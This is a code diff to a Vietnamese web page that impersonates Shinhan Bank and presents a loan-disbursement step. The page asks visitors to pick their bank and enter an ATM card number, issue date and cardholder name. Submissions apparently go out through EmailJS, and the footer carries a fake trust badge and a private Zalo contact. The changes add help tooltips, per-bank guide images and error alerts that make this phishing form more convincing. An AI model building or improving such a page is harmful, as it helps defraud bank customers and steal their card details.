@@ -172,7 +172,7 @@
             height: 12px;
             margin: 0 6px;
             background: #ccc;
-            border-radius: 50%;
+            border-radius: 5px;
             cursor: pointer;
             transition: background 0.3s;
         }
@@ -318,6 +318,8 @@
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
+            display: flex;
+            align-items: center;
         }
         .form-group .input-wrapper {
             display: flex;
@@ -343,6 +345,24 @@
             font-size: 12px;
             color: #666;
             margin-top: 5px;
+            display: none;
+        }
+        .form-group .help-text.show {
+            display: block;
+        }
+        .help-icon {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background-color: red;
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            margin-left: 5px;
+            cursor: pointer;
         }
         .help-image {
             margin-bottom: 15px;
@@ -593,175 +613,171 @@
             <div class="bank-selection" id="bank-selection">
                 <h3>Chọn ngân hàng</h3>
                 <div class="bank-grid">
-                    <div class="bank-option" data-bank="VIETCOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietcombank.png">
+                    <div class="bank-option" data-bank="VIETCOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietcombank.png" data-help-image="https://i.imgur.com/IHhDocl.jpeg">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/vietcombank.png" alt="VIETCOMBANK Logo">
                         <p>VIETCOMBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="AGRIBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/agribank.png">
+                    <div class="bank-option" data-bank="AGRIBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/agribank.png" data-help-image="https://via.placeholder.com/300x150?text=AGRIBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/agribank.png" alt="AGRIBANK Logo">
                         <p>AGRIBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="VIETINBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/viettinbank.png">
+                    <div class="bank-option" data-bank="VIETINBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/viettinbank.png" data-help-image="https://via.placeholder.com/300x150?text=VIETINBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/viettinbank.png" alt="VIETINBANK Logo">
                         <p>VIETINBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="BIDV" data-logo="https://www.vban.vn/Resources/images/logo-bank/bidv.png">
+                    <div class="bank-option" data-bank="BIDV" data-logo="https://www.vban.vn/Resources/images/logo-bank/bidv.png" data-help-image="https://via.placeholder.com/300x150?text=BIDV+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/bidv.png" alt="BIDV Logo">
                         <p>BIDV</p>
                     </div>
-                    <div class="bank-option" data-bank="SACOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/sacombank.png">
+                    <div class="bank-option" data-bank="SACOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/sacombank.png" data-help-image="https://via.placeholder.com/300x150?text=SACOMBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/sacombank.png" alt="SACOMBANK Logo">
                         <p>SACOMBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="DONGABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/dongabank.png">
+                    <div class="bank-option" data-bank="DONGABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/dongabank.png" data-help-image="https://via.placeholder.com/300x150?text=DONGABANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/dongabank.png" alt="DONGABANK Logo">
                         <p>DONGABANK</p>
                     </div>
-                    <div class="bank-option" data-bank="TECHCOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/techcombank.png">
+                    <div class="bank-option" data-bank="TECHCOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/techcombank.png" data-help-image="https://via.placeholder.com/300x150?text=TECHCOMBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/techcombank.png" alt="TECHCOMBANK Logo">
                         <p>TECHCOMBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="VPBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vpbank.png">
+                    <div class="bank-option" data-bank="VPBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vpbank.png" data-help-image="https://via.placeholder.com/300x150?text=VPBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/vpbank.png" alt="VPBANK Logo">
                         <p>VPBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="EXIMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/eximbank.png">
+                    <div class="bank-option" data-bank="EXIMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/eximbank.png" data-help-image="https://via.placeholder.com/300x150?text=EXIMBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/eximbank.png" alt="EXIMBANK Logo">
                         <p>EXIMBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="HDBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/hdbank.png">
+                    <div class="bank-option" data-bank="HDBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/hdbank.png" data-help-image="https://via.placeholder.com/300x150?text=HDBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/hdbank.png" alt="HDBANK Logo">
                         <p>HDBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="MSBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/maritimebank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/maritimebank.png" alt="MSBANK Logo">
-                        <p>MSBANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="TPBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/tpbank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/tpbank.png" alt="TPBANK Logo">
-                        <p>TPBANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="OJB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ojb.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/ojb.png" alt="OJB Logo">
-                        <p>OJB</p>
-                    </div>
-                    <div class="bank-option" data-bank="NCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ncb.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/ncb.png" alt="NCB Logo">
-                        <p>NCB</p>
-                    </div>
-                    <div class="bank-option" data-bank="NAMABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/namabank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/namabank.png" alt="NAMABANK Logo">
-                        <p>NAMABANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="ACB" data-logo="https://www.vban.vn/Resources/images/logo-bank/acb.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/acb.png" alt="ACB Logo">
-                        <p>ACB</p>
-                    </div>
-                    <div class="bank-option" data-bank="OCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ocb.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/ocb.png" alt="OCB Logo">
-                        <p>OCB</p>
-                    </div>
-                    <div class="bank-option" data-bank="SCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/scb.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/scb.png" alt="SCB Logo">
-                        <p>SCB</p>
-                    </div>
-                    <div class="bank-option" data-bank="IVB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ivbbank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/ivbbank.png" alt="IVB Logo">
-                        <p>IVB</p>
-                    </div>
-                    <div class="bank-option" data-bank="ABBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/abbank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/abbank.png" alt="ABBANK Logo">
-                        <p>ABBANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="SHB" data-logo="https://www.vban.vn/Resources/images/logo-bank/shb.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/shb.png" alt="SHB Logo">
-                        <p>SHB</p>
-                    </div>
-                    <div class="bank-option" data-bank="VIB" data-logo="https://www.vban.vn/Resources/images/logo-bank/vib.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/vib.png" alt="VIB Logo">
-                        <p>VIB</p>
-                    </div>
-                    <div class="bank-option" data-bank="VIETCAPITALBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietcapitalbank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/vietcapitalbank.png" alt="VIETCAPITALBANK Logo">
-                        <p>VIETCAPITALBANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="PVCOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/pvcombank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/pvcombank.png" alt="PVCOMBANK Logo">
-                        <p>PVCOMBANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="SAIGONBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/saigonbank.png">
-                        <img src="https://www.vban.vn/Resources/images/logo-bank/saigonbank.png" alt="SAIGONBANK Logo">
-                        <p>SAIGONBANK</p>
-                    </div>
-                    <div class="bank-option" data-bank="MBBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/mbbank.png">
+                    <div class="bank-option" data-bank="MBBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/mbbank.png" data-help-image="https://i.imgur.com/PKqsFnT.jpeg">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/mbbank.png" alt="MBBANK Logo">
                         <p>MBBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="WOORIBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/WOORIBANK.png">
+                    <div class="bank-option" data-bank="TPBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/tpbank.png" data-help-image="https://via.placeholder.com/300x150?text=TPBANK+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/tpbank.png" alt="TPBANK Logo">
+                        <p>TPBANK</p>
+                    </div>
+                    <div class="bank-option" data-bank="OJB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ojb.png" data-help-image="https://via.placeholder.com/300x150?text=OJB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/ojb.png" alt="OJB Logo">
+                        <p>OJB</p>
+                    </div>
+                    <div class="bank-option" data-bank="NCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ncb.png" data-help-image="https://via.placeholder.com/300x150?text=NCB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/ncb.png" alt="NCB Logo">
+                        <p>NCB</p>
+                    </div>
+                    <div class="bank-option" data-bank="NAMABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/namabank.png" data-help-image="https://via.placeholder.com/300x150?text=NAMABANK+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/namabank.png" alt="NAMABANK Logo">
+                        <p>NAMABANK</p>
+                    </div>
+                    <div class="bank-option" data-bank="ACB" data-logo="https://www.vban.vn/Resources/images/logo-bank/acb.png" data-help-image="https://via.placeholder.com/300x150?text=ACB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/acb.png" alt="ACB Logo">
+                        <p>ACB</p>
+                    </div>
+                    <div class="bank-option" data-bank="OCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ocb.png" data-help-image="https://via.placeholder.com/300x150?text=OCB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/ocb.png" alt="OCB Logo">
+                        <p>OCB</p>
+                    </div>
+                    <div class="bank-option" data-bank="SCB" data-logo="https://www.vban.vn/Resources/images/logo-bank/scb.png" data-help-image="https://via.placeholder.com/300x150?text=SCB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/scb.png" alt="SCB Logo">
+                        <p>SCB</p>
+                    </div>
+                    <div class="bank-option" data-bank="IVB" data-logo="https://www.vban.vn/Resources/images/logo-bank/ivbbank.png" data-help-image="https://via.placeholder.com/300x150?text=IVB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/ivbbank.png" alt="IVB Logo">
+                        <p>IVB</p>
+                    </div>
+                    <div class="bank-option" data-bank="ABBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/abbank.png" data-help-image="https://via.placeholder.com/300x150?text=ABBANK+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/abbank.png" alt="ABBANK Logo">
+                        <p>ABBANK</p>
+                    </div>
+                    <div class="bank-option" data-bank="SHB" data-logo="https://www.vban.vn/Resources/images/logo-bank/shb.png" data-help-image="https://via.placeholder.com/300x150?text=SHB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/shb.png" alt="SHB Logo">
+                        <p>SHB</p>
+                    </div>
+                    <div class="bank-option" data-bank="VIB" data-logo="https://www.vban.vn/Resources/images/logo-bank/vib.png" data-help-image="https://via.placeholder.com/300x150?text=VIB+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/vib.png" alt="VIB Logo">
+                        <p>VIB</p>
+                    </div>
+                    <div class="bank-option" data-bank="VIETCAPITALBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietcapitalbank.png" data-help-image="https://via.placeholder.com/300x150?text=VIETCAPITALBANK+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/vietcapitalbank.png" alt="VIETCAPITALBANK Logo">
+                        <p>VIETCAPITALBANK</p>
+                    </div>
+                    <div class="bank-option" data-bank="PVCOMBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/pvcombank.png" data-help-image="https://via.placeholder.com/300x150?text=PVCOMBANK+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/pvcombank.png" alt="PVCOMBANK Logo">
+                        <p>PVCOMBANK</p>
+                    </div>
+                    <div class="bank-option" data-bank="SAIGONBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/saigonbank.png" data-help-image="https://via.placeholder.com/300x150?text=SAIGONBANK+Guide">
+                        <img src="https://www.vban.vn/Resources/images/logo-bank/saigonbank.png" alt="SAIGONBANK Logo">
+                        <p>SAIGONBANK</p>
+                    </div>
+                    <div class="bank-option" data-bank="WOORIBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/WOORIBANK.png" data-help-image="https://via.placeholder.com/300x150?text=WOORIBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/WOORIBANK.png" alt="WOORIBANK Logo">
                         <p>WOORIBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="VIETBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/VIETBANK.png">
+                    <div class="bank-option" data-bank="VIETBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/VIETBANK.png" data-help-image="https://via.placeholder.com/300x150?text=VIETBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/VIETBANK.png" alt="VIETBANK Logo">
                         <p>VIETBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="SEABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/SEABANK.png">
+                    <div class="bank-option" data-bank="SEABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/SEABANK.png" data-help-image="https://via.placeholder.com/300x150?text=SEABANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/SEABANK.png" alt="SEABANK Logo">
                         <p>SEABANK</p>
                     </div>
-                    <div class="bank-option" data-bank="VIETABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietabank.png">
+                    <div class="bank-option" data-bank="VIETABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietabank.png" data-help-image="https://via.placeholder.com/300x150?text=VIETABANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/vietabank.png" alt="VIETABANK Logo">
                         <p>VIETABANK</p>
                     </div>
-                    <div class="bank-option" data-bank="BACABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/bacabank.png">
+                    <div class="bank-option" data-bank="BACABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/bacabank.png" data-help-image="https://via.placeholder.com/300x150?text=BACABANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/bacabank.png" alt="BACABANK Logo">
                         <p>BACABANK</p>
                     </div>
-                    <div class="bank-option" data-bank="KIENLONGBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/kienlongbank.png">
+                    <div class="bank-option" data-bank="KIENLONGBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/kienlongbank.png" data-help-image="https://via.placeholder.com/300x150?text=KIENLONGBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/kienlongbank.png" alt="KIENLONGBANK Logo">
                         <p>KIENLONGBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="BAOVIETBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/baovietbank.png">
+                    <div class="bank-option" data-bank="BAOVIETBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/baovietbank.png" data-help-image="https://via.placeholder.com/300x150?text=BAOVIETBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/baovietbank.png" alt="BAOVIETBANK Logo">
                         <p>BAOVIETBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="VIDBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vidbank.png">
+                    <div class="bank-option" data-bank="VIDBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/vidbank.png" data-help-image="https://via.placeholder.com/300x150?text=VIDBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/vidbank.png" alt="VIDBANK Logo">
                         <p>VIDBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="PGBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/pgbank.png">
+                    <div class="bank-option" data-bank="PGBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/pgbank.png" data-help-image="https://via.placeholder.com/300x150?text=PGBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/pgbank.png" alt="PGBANK Logo">
                         <p>PGBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="LIENVIETBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/lienvietbank.png">
+                    <div class="bank-option" data-bank="LIENVIETBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/lienvietbank.png" data-help-image="https://via.placeholder.com/300x150?text=LIENVIETBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/lienvietbank.png" alt="LIENVIETBANK Logo">
                         <p>LIENVIETBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="GPBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/gpbank.png">
+                    <div class="bank-option" data-bank="GPBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/gpbank.png" data-help-image="https://via.placeholder.com/300x150?text=GPBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/gpbank.png" alt="GPBANK Logo">
                         <p>GPBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="VRB" data-logo="https://www.vban.vn/Resources/images/logo-bank/vrbbank.png">
+                    <div class="bank-option" data-bank="VRB" data-logo="https://www.vban.vn/Resources/images/logo-bank/vrbbank.png" data-help-image="https://via.placeholder.com/300x150?text=VRB+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/vrbbank.png" alt="VRB Logo">
                         <p>VRB</p>
                     </div>
-                    <div class="bank-option" data-bank="SHINHANBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/shinhanbank.png">
+                    <div class="bank-option" data-bank="SHINHANBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/shinhanbank.png" data-help-image="https://via.placeholder.com/300x150?text=SHINHANBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/shinhanbank.png" alt="SHINHANBANK Logo">
                         <p>SHINHANBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="UOB" data-logo="https://www.vban.vn/Resources/images/logo-bank/uobbank.png">
+                    <div class="bank-option" data-bank="UOB" data-logo="https://www.vban.vn/Resources/images/logo-bank/uobbank.png" data-help-image="https://via.placeholder.com/300x150?text=UOB+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/uobbank.png" alt="UOB Logo">
                         <p>UOB</p>
                     </div>
-                    <div class="bank-option" data-bank="VIETCREDIT" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietcredit.svg">
+                    <div class="bank-option" data-bank="VIETCREDIT" data-logo="https://www.vban.vn/Resources/images/logo-bank/vietcredit.svg" data-help-image="https://via.placeholder.com/300x150?text=VIETCREDIT+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/vietcredit.svg" alt="VIETCREDIT Logo">
                         <p>VIETCREDIT</p>
                     </div>
-                    <div class="bank-option" data-bank="MAFC" data-logo="https://www.vban.vn/Resources/images/logo-bank/MAFC.svg">
+                    <div class="bank-option" data-bank="MAFC" data-logo="https://www.vban.vn/Resources/images/logo-bank/MAFC.svg" data-help-image="https://via.placeholder.com/300x150?text=MAFC+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/MAFC.svg" alt="MAFC Logo">
                         <p>MAFC</p>
                     </div>
-                    <div class="bank-option" data-bank="OCBLIOBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/liobank.png">
+                    <div class="bank-option" data-bank="OCBLIOBANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/liobank.png" data-help-image="https://via.placeholder.com/300x150?text=OCBLIOBANK+Guide">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/liobank.png" alt="OCBLIOBANK Logo">
                         <p>OCBLIOBANK</p>
                     </div>
@@ -773,34 +789,37 @@
             </div>
             <div class="help-image" id="helpImage">
                 <img src="https://i.imgur.com/Mshq9xi.jpeg" alt="Hướng dẫn nhập thông tin thẻ">
-                <div class="overlay-text">Hướng dẫn nhập thông tin thẻ Napas<br>Số thẻ Napas in trên mặt trước thẻ.</div>
+                <div class="overlay-text">Hướng dẫn nhập thông tin thẻ ATM<br>Số thẻ ATM in trên mặt trước thẻ.</div>
             </div>
             <div class="guide-section" id="card-guide">
                 <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
-                <h3>Nhập thông tin thẻ Napas</h3>
-                <p>Số thẻ Napas bắt đầu bằng 9704, thông tin khác ở mặt trước thẻ.</p>
+                <h3>GIẢI NGÂN QUA THẺ ATM</h3>
+                <p>Tiền Giải Ngân Sẽ Được Chuyển Trực Tiếp Vào Số Tài Khoản Ngân Hàng Được Liên Kết Với Thẻ ATM.</p>
             </div>
             <form id="card-info-form" class="card-form">
                 <div class="form-group" aria-live="polite">
-                    <label for="napasCardNumber">Số thẻ Napas *</label>
+                    <label for="napasCardNumber">Số Thẻ *<span class="help-icon" onclick="toggleHelpText('napasCardNumberHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="napasCardNumber" placeholder="9704 ..." maxlength="23" required aria-describedby="napasCardNumberError">
                     </div>
+                    <span class="help-text" id="napasCardNumberHelp">Số thẻ in trên mặt trước thẻ Napas, bắt đầu bằng 9704.</span>
                     <span class="error" id="napasCardNumberError">Số thẻ phải bắt đầu bằng 9704</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="napasIssueDate">Ngày phát hành *</label>
+                    <label for="napasIssueDate">Ngày Phát Hành *<span class="help-icon" onclick="toggleHelpText('napasIssueDateHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="napasIssueDate" placeholder="05/25" maxlength="5" required aria-describedby="napasIssueDateError">
                     </div>
+                    <span class="help-text" id="napasIssueDateHelp">Ngày phát hành trên thẻ, định dạng mm/yy (ví dụ: 05/25).</span>
                     <span class="error" id="napasIssueDateError">Ngày phát hành phải hợp lệ (mm/yy, không phải tương lai)</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="napasFullName">Họ và tên chủ thẻ *</label>
+                    <label for="napasFullName">Tên Chủ Thẻ *<span class="help-icon" onclick="toggleHelpText('napasFullNameHelp')">?</span></label>
                     <div class="input-wrapper">
                         <input type="text" id="napasFullName" required aria-describedby="napasFullNameError">
                     </div>
-                    <span class="error" id="napasFullNameError">Họ và tên không đúng</span>
+                    <span class="help-text" id="napasFullNameHelp">Tên chủ thẻ in trên bề mặt thẻ.</span>
+                    <span class="error" id="napasFullNameError">Họ và tên phải trùng với thông tin trong hồ sơ đăng ký vay</span>
                 </div>
                 <div class="buttons">
                     <button type="submit" class="primary">Xác nhận</button>
@@ -810,7 +829,7 @@
     </div>
 
     <footer role="contentinfo" aria-label="Footer">
-        <p>Liên hệ: <a href="mailto:support@shinhanbank.vn">support@shinhanbank.vn</a> | Hotline: 1900-8198</p>
+        <p>Liên hệ: <a href="mailto:support@shinhanbank.vn">support@shinhanbank.vn</a> | Hotline: 1900-1234</p>
         <p><a href="http://zalo.me/84762797077">Hỗ trợ trò chuyện</a></p>
         <p>Kết nối an toàn với SSL</p>
         <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="PCI DSS">
@@ -825,11 +844,17 @@
         let bannerIndex = 0;
         let selectedBank = null;
         let selectedBankLogo = null;
+        let selectedBankHelpImage = null;
         let formData = {};
 
         function toggleSummary() {
             const summary = document.getElementById('summary');
             summary.classList.toggle('collapsed');
+        }
+
+        function toggleHelpText(helpId) {
+            const helpText = document.getElementById(helpId);
+            helpText.classList.toggle('show');
         }
 
         window.addEventListener('load', () => {
@@ -847,6 +872,7 @@
                     if (selectedOption) {
                         selectedOption.classList.add('selected');
                         selectedBankLogo = selectedOption.getAttribute('data-logo');
+                        selectedBankHelpImage = selectedOption.getAttribute('data-help-image');
                         document.getElementById('summaryBank').textContent = selectedBank;
                         confirmBank();
                     }
@@ -866,13 +892,18 @@
             hamburger.setAttribute('aria-expanded', menu.classList.contains('show'));
         }
 
-        function selectBank(bank, logo) {
+        function selectBank(bank, logo, helpImage) {
+            console.log('Selected bank:', bank, 'Logo:', logo, 'Help Image:', helpImage); // Debug
             selectedBank = bank;
             selectedBankLogo = logo;
+            selectedBankHelpImage = helpImage;
             document.querySelectorAll('.bank-option').forEach(option => {
                 option.classList.remove('selected');
             });
-            document.querySelector(`.bank-option[data-bank="${bank}"]`).classList.add('selected');
+            const selectedOption = document.querySelector(`.bank-option[data-bank="${bank}"]`);
+            if (selectedOption) {
+                selectedOption.classList.add('selected');
+            }
             document.getElementById('bankError').classList.remove('show');
         }
 
@@ -887,6 +918,8 @@
             document.getElementById('card-info-form').classList.add('active');
             document.getElementById('selected-bank-logo').src = selectedBankLogo || '';
             document.getElementById('selected-bank-logo').alt = `${selectedBank} Logo`;
+            document.querySelector('.help-image img').src = selectedBankHelpImage || 'https://i.imgur.com/Mshq9xi.jpeg';
+            document.querySelector('.help-image img').alt = `${selectedBank} Guide Image`;
             document.querySelector('.form-container h2').classList.add('active');
             document.getElementById('summaryBank').textContent = selectedBank;
             document.getElementById('helpImage').classList.add('active');
@@ -1033,6 +1066,8 @@
                     },
                     (error) => {
                         console.error('EmailJS error:', error);
+                        alert('Lỗi khi gửi thông tin. Vui lòng thử lại.');
+                    }
                 );
             }
 
@@ -1041,7 +1076,11 @@
 
         document.querySelectorAll('.bank-option').forEach(option => {
             option.addEventListener('click', () => {
-                selectBank(option.getAttribute('data-bank'), option.getAttribute('data-logo'));
+                selectBank(
+                    option.getAttribute('data-bank'),
+                    option.getAttribute('data-logo'),
+                    option.getAttribute('data-help-image')
+                );
             });
         });
 
